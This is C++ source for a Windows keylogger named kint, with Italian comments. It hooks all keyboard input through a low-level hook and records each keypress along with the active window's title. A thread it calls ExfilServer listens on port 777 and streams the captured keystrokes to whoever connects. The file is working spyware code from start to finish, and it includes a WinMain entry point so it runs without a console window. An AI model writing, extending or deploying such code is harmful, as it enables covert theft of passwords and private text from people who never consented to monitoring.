// kint.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#pragma once

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCKAPI_
#define KINT_SERVER_PORT 777
#define KINT_KEYPRESS_HISTORY_LIMIT 131072     // 0 disabilita il limite
#define KINT_WINSOCK_VERSION MAKEWORD(2, 0)

#ifdef _DEBUG
#   define DebugPrint(...) printf(__VA_ARGS__);
#else
#   define DebugPrint(...)
#endif

#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <thread>
#include <kint_common.hpp>

#include "channel.hpp"

Channel<kint_common::keypress_t> message_channel(KINT_KEYPRESS_HISTORY_LIMIT);

static_assert((KINT_KEYPRESS_HISTORY_LIMIT * sizeof(kint_common::keypress_t)) < (1 << 27));    // fa in modo che la cronologia sia al massimo 128MB

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

    PKBDLLHOOKSTRUCT kbdInput = (PKBDLLHOOKSTRUCT)lParam;
    HWND hwndFocusedWindow = GetForegroundWindow();
    DWORD dwThreadId = GetWindowThreadProcessId(hwndFocusedWindow, NULL);
    WCHAR title[255];
    WCHAR keys[256];
    BYTE kbdState[256];

    switch (wParam) {
    case WM_SYSKEYUP:
    case WM_KEYUP:
        break;
    case WM_SYSKEYDOWN:
    case WM_KEYDOWN:
        if (kbdInput->vkCode == VK_SHIFT || kbdInput->vkCode == VK_LSHIFT) break;

        HKL hklKeyboardLayout = GetKeyboardLayout(dwThreadId);
        char pressedKey[2] = { 0 };

        GetKeyState(VK_CAPITAL);
        GetKeyState(VK_SHIFT);

        if (!GetKeyboardState(kbdState)) {
            DebugPrint("[!] Impossibile ottenere il layout della tastiera.\n");
            goto done;
        }
        
        int titleLength = GetWindowTextW(hwndFocusedWindow, title, 255);
        char utf8Title[sizeof title];

        if (titleLength == 0) {
            strcpy(utf8Title, "<SENZANOME>");
        } else {
            kint_common::FromWcharToChar(title, utf8Title, sizeof utf8Title);
        }

        int totKeys = ToUnicodeEx(
            kbdInput->vkCode,
            kbdInput->scanCode,
            kbdState,
            keys,
            255,
            2,
            hklKeyboardLayout
        );

        kint_common::FromWcharToChar(keys, pressedKey, totKeys);
        DebugPrint(
            "[*] Keypress 0x%x ricevuto da '%s' (scancode 0x%x), che e' '%s'\r\n",
            kbdInput->vkCode,
            utf8Title,
            kbdInput->scanCode,
            kint_common::IsHumanReadable(kbdInput->vkCode) ? pressedKey : kint_common::ToHumanReadable(kbdInput->vkCode).c_str()
        );

        message_channel.QueueMessage({ kbdInput, utf8Title, pressedKey });
    }

done:
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void ExfilServer() {
    DebugPrint("[*] Avvio di winsock\n");

    WSADATA data;
    SOCKADDR_IN server_addr, client_addr;
    SOCKET client;

    int client_addr_size = sizeof(client_addr);
    int err = WSAStartup(KINT_WINSOCK_VERSION, &data);
    bool exiting = false;

    if (err != NO_ERROR) {
        DebugPrint("[!] Impossibile avviare winsock\n");
        DebugPrint("[!] WSAStartup: %d", err);
        exit(1);
    }

    const SOCKET server = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(KINT_SERVER_PORT);

    bind(server, (SOCKADDR*)&server_addr, sizeof server_addr);
    
    if (listen(server, 0) == SOCKET_ERROR) {
        DebugPrint("[!] listen() ha restituito SOCKET_ERROR\n");
        DebugPrint("[!] WSAGetLastError: %s\n", kint_common::WsaErrorToString(WSAGetLastError()).c_str());
        exit(1);
    }

    while (!exiting) {
        DebugPrint("[*] In attesa di un client\n");

        if ((client = accept(server, reinterpret_cast<SOCKADDR*>(&client_addr), &client_addr_size)) == INVALID_SOCKET) {
            int error = WSAGetLastError();
            DebugPrint("[!] accept() ha restituito INVALID_SOCKET\n");

            switch (error) {
            case WSAENETDOWN:
                DebugPrint("[!] WSAGetLastError: WSAENETDOWN, nuovo tentativo tra 1 minuto\n");
                std::this_thread::sleep_for(std::chrono::minutes(1));
                continue;
            case WSAENOBUFS:
                DebugPrint("[!] WSAGetLastError: WSAENOBUFS, impossibile continuare\n");
                exit(1);
                continue;
            case WSAECONNRESET:
                DebugPrint("[!] WSAGetLastError: WSAECONNRESET\n");
                continue;
            default:
                DebugPrint("[!] WSAGetLastError: %s\n", kint_common::WsaErrorToString(error).c_str());
                continue;
            }
        }

        DebugPrint("[*] Ricevuta connessione da un client\n");

        while (true) {
            std::optional<kint_common::keypress_t> k = message_channel.WaitForNextMessage();

            if (k == std::nullopt) {
                exiting = true;
                break;
            }

            int res = send(client, k->as_raw_memory(), sizeof kint_common::keypress_t, NULL);

            if (res == SOCKET_ERROR || res == 0) {
                DebugPrint("[!] Il client si e' disconnesso\n");
                closesocket(client);
                message_channel.QueueMessage(k.value());
                break;
            }
        }
    }
}

int main() {
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, NULL);
    MSG msg;
    std::thread serverThread(ExfilServer);

    if (hHook == NULL) {
        DebugPrint("[*] Errore durante l'installazione dell'hook WH_KEYBOARD_LL: 0x%x\n", GetLastError());
        return 1;
    }

    DebugPrint("[*] Hook installato\n");

    while (!GetMessageW(&msg, NULL, NULL, NULL)) {    // GetMessageW == 0 quando riceviamo WM_QUIT da windows
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    DebugPrint("[*] Chiusura in corso\n");

    UnhookWindowsHookEx(hHook);
    message_channel.Close();
    serverThread.join();

    return 0;
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShowCmd)
{
    return main();
}
